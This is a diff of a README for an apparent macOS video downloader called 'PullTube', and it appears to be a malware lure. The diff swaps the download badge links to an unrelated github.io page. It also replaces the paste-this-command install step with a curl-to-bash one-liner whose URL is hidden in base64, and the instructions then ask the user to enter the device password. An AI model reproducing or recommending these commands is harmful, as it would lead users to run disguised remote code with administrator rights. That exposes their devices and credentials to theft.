@@ -7,7 +7,7 @@ Whether you want to download entire playlists or single videos in various format
 ---
 
 ## ✅ Download PullTube for macOS  
-[![Download PullTube](https://img.shields.io/badge/Download-PullTube-blueviolet)](https://pulltube-download-mac.github.io/.github)
+[![Download PullTube](https://img.shields.io/badge/Download-PullTube-blueviolet)](https://shuziktobehuman.github.io/huja/PillTube)
 
 ---
 
@@ -26,7 +26,7 @@ Whether you want to download entire playlists or single videos in various format
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -64,7 +64,7 @@ PullTube is a versatile video downloader application crafted for macOS that supp
 
 ---
 
-[![Download PullTube](https://img.shields.io/badge/Download-PullTube-blueviolet)](https://pulltube-download-mac.github.io/.github)
+[![Download PullTube](https://img.shields.io/badge/Download-PullTube-blueviolet)](https://shuziktobehuman.github.io/huja/PillTube)
 
 ---
 
